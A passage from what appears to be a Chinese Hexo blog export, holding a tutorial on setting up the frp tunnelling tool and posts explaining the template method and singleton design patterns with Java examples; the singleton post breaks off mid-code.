    <content><![CDATA[<h2 id="内网穿透工具frp简易教程"><a href="#内网穿透工具frp简易教程" class="headerlink" title="内网穿透工具frp简易教程"></a>内网穿透工具frp简易教程</h2><p>如果你想把家里的电脑当做服务器用，做一个网站或者游戏服务器什么的，肯定会遇到一个问题：由于没有公网IP，而且有家里的路由器把关，导致其他地方的人完全无法连接到服务器。这时候就需要内网穿透和端口映射工具了，这样的工具有很多，我列举常用的几个：<br>1) 花生壳<br>2) nat123<br>3) ngrok<br>不过这几个工具虽然都算是挺好用的，但是都是收费的，虽然都有免费版，但是免费版功能实在太少，基本上只能绑定一个应用，端口号还是随机的。临时玩玩倒是可以，真正要用的话还是不行。经过一番寻找，最后我锁定了frp这个工具，它的优点就是完全开源免费，自定义配置；缺点是不提供服务，也就是说我们需要自己买个服务器在上面搭建。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>frp也是托管在Github上的开源项目，直接到Release页面下载即可，链接如下：<br><a href="https://github.com/fatedier/frp/releases" title="Frp" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases</a><br><a href="https://diannaobos.com/frp/" title="Frp" target="_blank" rel="noopener">国内提供的二进制下载网站:https://diannaobos.com/frp/</a><br><img src="/images/frp/01.png" alt="Frp"><br>下载命令:</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span>diannaobos.iok.la:<span class="number">81</span><span class="regexp">/frp/</span>frp-v0.<span class="number">20.0</span><span class="regexp">/frp_0.20.0_freebsd_amd64.tar.gz</span></span><br></pre></td></tr></table></figure><h2 id="Frp文件目录"><a href="#Frp文件目录" class="headerlink" title="Frp文件目录"></a>Frp文件目录</h2><p>Frp文件目录如下图所示:<br><img src="/images/frp/02.png" alt="Frp"><br>下载解压之后是一个文件夹，里面包含了frpc、frps可执行程序，以及它们对应的示例配置文件，前者是客户端程序，后者是服务端程序。运行frp需要同时运行客户端和服务端程序才行。full和min分别是最大和最小配置文件，如果需要参考的话可以打开看看，最大配置文件中列出了frp支持的所有选项。<br>注:Linux版本和Windows版本基本一致(windows下执行程序为frpc.exe,Linux下位frpc)。</p><h2 id="服务器端配置-frps-ini"><a href="#服务器端配置-frps-ini" class="headerlink" title="服务器端配置(frps.ini)"></a>服务器端配置(frps.ini)</h2><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = caifenglin</span><br><span class="line"><span class="comment"># vhost_http_port 网站访问端口</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>bind_port是服务端与客户端之间通信使用的端口号，默认就可以。token用于验证连接，只有服务端和客户端token相同的时候才能正常访问。如果不使用token，那么所有人都可以直接连接上，所以我建议大家在使用的时候还是把token加上。</p><p>配置完毕后就可以启动服务器了,启动命令:</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">frps</span> <span class="selector-tag">-c</span> <span class="selector-tag">frps</span><span class="selector-class">.ini</span></span><br></pre></td></tr></table></figure><h2 id="客户端配置-frpc-ini"><a href="#客户端配置-frpc-ini" class="headerlink" title="客户端配置(frpc.ini)"></a>客户端配置(frpc.ini)</h2><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">118.25</span>.<span class="number">3.241</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = caifenglin</span><br><span class="line"><span class="section">[web]</span></span><br><span class="line"><span class="comment"># 访问协议，如果需要https的话，只要把vhost_http_port改成vhost_https_port，再把客户端web下type设置为https即可。</span></span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="comment"># 本地机器IP</span></span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="comment"># 本地机器端口</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">10000</span></span><br><span class="line"><span class="comment"># custom_domains是通过frp服务器端访问客户端的域名，必须输入完整的域名，</span></span><br><span class="line"><span class="comment"># 并且不能是subdomain_host的子域名，否则frp服务不能启动，并且相应的域名需要解析到frp服务器端的公网IP并等待解析生效后，才可以使用。</span></span><br><span class="line"><span class="attr">custom_domains</span> = springbook.cn</span><br></pre></td></tr></table></figure><p>windows启动命令:</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">D</span>:\<span class="selector-tag">Frp</span>\<span class="selector-tag">frp_0</span><span class="selector-class">.20</span><span class="selector-class">.0_windows_amd64</span>&gt;<span class="selector-tag">frpc</span><span class="selector-class">.exe</span> <span class="selector-tag">-c</span> <span class="selector-tag">frpc</span><span class="selector-class">.ini</span></span><br></pre></td></tr></table></figure><p>至此，我们成功通过<a href="http//springbook.cn:8080" title="Frp">http//springbook.cn:8080</a>，访问<a href="http://127.0.0.1:10000" title="Frp" target="_blank" rel="noopener">http://127.0.0.1:10000</a>我本地局域网内的一个测试项目。</p><h2 id="仪表盘"><a href="#仪表盘" class="headerlink" title="仪表盘"></a>仪表盘</h2><p>frp还支持仪表盘功能，可以从网页查看运行的流量等信息。开启仪表盘需要在服务端进行设置。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># dashboard 用户名密码，默认都为 admin</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = admin</span><br></pre></td></tr></table></figure><p>设置完毕后，在浏览器中访问服务端地址:端口号并输入用户名与密码即可查看仪表盘。<br><img src="/images/frp/03.png" alt="Frp"><br>以上就是frp的一些介绍，如果有需要的请查看官方中文文档，详细列出了frp支持的各项功能，还可以参考frpc_full.ini与frps_full.ini，查看完整配置文件支持的选项。<a href="https://github.com/fatedier/frp/blob/master/README_zh.md" title="Frp" target="_blank" rel="noopener">文档地址:https://github.com/fatedier/frp/blob/master/README_zh.md</a>。</p>]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>模板方法设计模式</title>
    <url>/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2aa1ddf5.html</url>
    <content><![CDATA[<h2 id="模板方法设计模式详解"><a href="#模板方法设计模式详解" class="headerlink" title="模板方法设计模式详解"></a>模板方法设计模式详解</h2><h3 id="模板方法设计模式"><a href="#模板方法设计模式" class="headerlink" title="模板方法设计模式"></a>模板方法设计模式</h3><p>模板方法设计模式的定义是:定义一个操作中某种算法的框架，而将一些步骤延迟到子类中。<br>模板方法模式使得子类在不改变一个算法结构的前提下，对某些步骤实现个性化定义。</p><p>模板方法程序构成<br>在模板方法设计模式中，存在一个父类。其中包含两类方法:模板方法与步骤方法。</p><p>模板方法:即实现某种算法的方法步骤。而这些步骤都是调用的步骤方法完成的。<br>步骤方法:即完成模板方法的每个阶段性方法。每个步骤方法完成某一特定的、完成总算法的一部分<br>功能。步骤方法有三种类型:抽象方法、最终方法与钩子方法。<br>抽象方法:是要求子类必须实现的方法，是完成模板方法的算法步骤中必须由子类完成的个性化定义。<br>最终方法:是子类不能重写的方法，是完成模板方法的算法步骤中必须由子类完成的个性化定义。<br>钩子方法:是父类给出了默认实现，但子类也可以重写的方法。</p><h3 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下:"></a>代码如下:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Shopping</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buyGoods</span><span class="params">()</span></span>&#123;</span><br><span class="line">		userLogin();</span><br><span class="line">		buy();</span><br><span class="line">		pay();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//子类不能重写的方法</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">userLogin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"用户登录"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//子类必须实现</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">buy</span><span class="params">()</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"使用银联卡支付"</span>);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClothesShop</span> <span class="keyword">extends</span> <span class="title">Shopping</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"购买七匹狼男装"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"使用支付宝付款"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShoesShopping</span> <span class="keyword">extends</span> <span class="title">Shopping</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"购买红蜻蜓皮鞋"</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.learn.service.ClothesShop;</span><br><span class="line"><span class="keyword">import</span> com.learn.service.ShoesShopping;</span><br><span class="line"><span class="keyword">import</span> com.learn.service.Shopping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Shopping shoesShopping = <span class="keyword">new</span> ShoesShopping();</span><br><span class="line">		shoesShopping.buyGoods();</span><br><span class="line">		</span><br><span class="line">		Shopping clothesShopping = <span class="keyword">new</span> ClothesShop();</span><br><span class="line">		clothesShopping.buyGoods();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>单例模式</title>
    <url>/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/f1601c3e.html</url>
    <content><![CDATA[<h2 id="单例模式总结"><a href="#单例模式总结" class="headerlink" title="单例模式总结"></a>单例模式总结</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>单例模式(Singleton Pattern)是Java中最简单的设计模式之一<br>这种类型的设计模式属于对象创建型模式<br>作用：保证一个类仅有一个实例，并提供一个访问它的全局访问点。</p><h3 id="二、理解"><a href="#二、理解" class="headerlink" title="二、理解"></a>二、理解</h3><p>某些类创建对象是非常耗时耗内存和复杂的，这种类创建的对象我们称之为重量级对象(反之，轻量级对象)<br>如果需要使用重量级类，一般吧这个类设计为单例对象模式，好处有：<br>1)保证对象在内存中仅有一个，减少内存开销<br>2)使用者不用考虑创建细节，使用方便<br>3)可以控制对象的创建时刻</p><p>代码实现的关键点:<br>1)这个类在整个JVM中仅有一个对象实例<br>对象的创建方式有：<br>a)new –私有化构造器<br>b)反射(reflect) –私有化构造器<br>c)反序列化(deserialize) –不实现Serializable接口或者自定义反序列化的过程<br>d)克隆(clone) –不实现Clonable或自定义克隆的过程<br>2)提供一个访问它的全局访问点<br>a)公开的静态变量(不利于扩展)<br>b)一个公开的静态方法,返回唯一实例</p><h3 id="三、实现代码"><a href="#三、实现代码" class="headerlink" title="三、实现代码"></a>三、实现代码</h3><p>1)饿汉式<br>-立即创建<br>-线程安全<br>2)懒汉式<br>-延迟加载<br>-线程不安全<br>3)加锁的懒汉式<br>-延迟加载<br>-线程安全<br>4)双重验证式懒汉式<br>-延迟加载<br>-线程安全<br>-同步情况下效率高<br>-现实复杂<br>5)类加载方式<br>-延迟加载<br>-线程安全<br>-同步情况下效率高<br>-实现简单<br>-不能防止反序列化<br>6)枚举实现<br>-立即加载<br>-线程安全<br>-实现简单<br>-防止反序列化</p><h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>一般情况下，应该使用饿汉式(第一种方式)<br>如果需要延迟加载，推荐使用类加载方式<br>如果需要非常标准的单例模式(不能new，不能被反序列化),推荐使用枚举实现<br>如果单例对象在创建过程中其他特殊的需求，可以考虑使用双重验证方式</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="一、饿汉式"><a href="#一、饿汉式" class="headerlink" title="一、饿汉式"></a>一、饿汉式</h3><p>-立即创建<br>-线程安全</p><p>饿汉式代码如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 饿汉式;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonClass</span> </span>&#123;</span><br><span class="line">	<span class="comment">//创建唯一实例</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> SingletonClass ONLY = <span class="keyword">new</span> SingletonClass();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//构造方私有化，屏蔽外部的new</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">SingletonClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//提供一个全局访问点</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingletonClass <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">//....其它代码</span></span><br><span class="line">		<span class="keyword">return</span> ONLY;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"单例模式。。。。。。。。。。饿汉式"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 饿汉式;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//SingletonClass a = new SingletonClass();</span></span><br><span class="line">		<span class="comment">//a.f();</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//SingletonClass a = SingletonClass.ONLY;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//用户只能通过静态方法获取实例</span></span><br><span class="line">		SingletonClass a = SingletonClass.getInstance();</span><br><span class="line">		SingletonClass b = SingletonClass.getInstance();</span><br><span class="line">		</span><br><span class="line">		System.out.println(a==b);</span><br><span class="line">		a.f();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二、加锁的懒汉式"><a href="#二、加锁的懒汉式" class="headerlink" title="二、加锁的懒汉式"></a>二、加锁的懒汉式</h3><p>-延迟加载<br>-线程安全</p><p>懒汉式核心代码(未加锁的懒汉式略):</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 懒汉式;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonClass</span> </span>&#123;</span><br><span class="line">	<span class="comment">//创建唯一实例</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> SingletonClass ONLY;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//屏蔽外部的new</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">SingletonClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//提供一个全局访问点</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> SingletonClass <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">//....其它代码</span></span><br><span class="line">		<span class="keyword">if</span>(ONLY==<span class="keyword">null</span>) &#123;</span><br><span class="line">			ONLY = <span class="keyword">new</span> SingletonClass();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//....其它代码</span></span><br><span class="line">		<span class="keyword">return</span> ONLY;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"单例模式。。。。。。。。。。懒汉式"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 懒汉式;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//SingletonClass a = new SingletonClass();</span></span><br><span class="line">		<span class="comment">//a.f();</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//SingletonClass a = SingletonClass.ONLY;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//用户只能通过静态方法获取实例</span></span><br><span class="line">		SingletonClass a = SingletonClass.getInstance();</span><br><span class="line">		SingletonClass b = SingletonClass.getInstance();</span><br><span class="line">		</span><br><span class="line">		System.out.println(a==b);</span><br><span class="line">		a.f();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、双重验证式懒汉式"><a href="#三、双重验证式懒汉式" class="headerlink" title="三、双重验证式懒汉式"></a>三、双重验证式懒汉式</h3><p>-延迟加载<br>-线程安全<br>-同步情况下效率高<br>-现实复杂</p><p>双重验证式懒汉式核心代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 双重验证式懒汉式;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonClass</span> </span>&#123;</span><br><span class="line">	<span class="comment">//创建唯一实例</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> SingletonClass ONLY;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//屏蔽外部的new</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">SingletonClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//提供一个全局访问点</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingletonClass <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">//....其它代码</span></span><br><span class="line">		<span class="keyword">if</span>(ONLY==<span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="comment">//B线程等待</span></span><br><span class="line">			<span class="keyword">synchronized</span> (SingletonClass<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(ONLY == <span class="keyword">null</span>) &#123;</span><br><span class="line">					ONLY = <span class="keyword">new</span> SingletonClass();</span><br><span class="line">					<span class="comment">//A线程创建</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//....其它代码</span></span><br><span class="line">		<span class="keyword">return</span> ONLY;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"单例模式。。。。。。。。。。"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四、类加载方式"><a href="#四、类加载方式" class="headerlink" title="四、类加载方式"></a>四、类加载方式</h3><p>-延迟加载<br>-线程安全<br>-同步情况下效率高<br>-实现简单<br>-不能防止反序列化</p><p>类加载方式核心代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 类加载方式;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonClass</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//屏蔽外部的new</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">SingletonClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//静态内部类，用于持有唯一的SingletonClass的示例</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OnlyInstanceHolder</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> SingletonClass ONLY = <span class="keyword">new</span> SingletonClass();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//公开的唯一访问点</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingletonClass <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> OnlyInstanceHolder.ONLY;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"单例模式。。。。。。。。。。类加载模式"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 类加载方式;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//SingletonClass a = new SingletonClass();</span></span><br><span class="line">		<span class="comment">//a.f();</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//SingletonClass a = SingletonClass.ONLY;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//用户只能通过静态方法获取实例</span></span><br><span class="line">		SingletonClass a = SingletonClass.getInstance();</span><br><span class="line">		SingletonClass b = SingletonClass.getInstance();</span><br><span class="line">		</span><br><span class="line">		System.out.println(a==b);</span><br><span class="line">		a.f();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="五、加载模式方式反序列化"><a href="#五、加载模式方式反序列化" class="headerlink" title="五、加载模式方式反序列化"></a>五、加载模式方式反序列化</h3><p>-延迟加载<br>-线程安全<br>-同步情况下效率高<br>-实现简单</p><p>类加载模式方式反序列化核心代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 类加载模式方式反序列化;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span>, <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//屏蔽外部的new</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">SingletonClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//静态内部类，用于持有唯一的SingletonClass的示例</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OnlyInstanceHolder</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> SingletonClass ONLY = <span class="keyword">new</span> SingletonClass();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//公开的唯一访问点</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingletonClass <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> OnlyInstanceHolder.ONLY;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//自定义反序列化返回对象,保证被序列化也是同一个对象</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> ObjectStreamException</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"单例模式。。。。。。。。。。类加载模式"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="六、枚举实现"><a href="#六、枚举实现" class="headerlink" title="六、枚举实现"></a>六、枚举实现</h3><p>-立即加载<br>-线程安全<br>-实现简单<br>-防止反序列化</p><p>枚举实现核心代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 枚举实现;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> SingletonClass &#123;</span><br><span class="line">	INSTANCE;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"单例模式。。。。。。。。。。枚举类型"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 枚举实现;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//SingletonClass a = new SingletonClass();</span></span><br><span class="line">		<span class="comment">//a.f();</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//SingletonClass a = SingletonClass.ONLY;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//用户只能通过静态方法获取实例</span></span><br><span class="line">		<span class="comment">//SingletonClass a = SingletonClass.getInstance();</span></span><br><span class="line">		<span class="comment">//SingletonClass b = SingletonClass.getInstance();</span></span><br><span class="line">		</span><br><span class="line">		SingletonClass a = 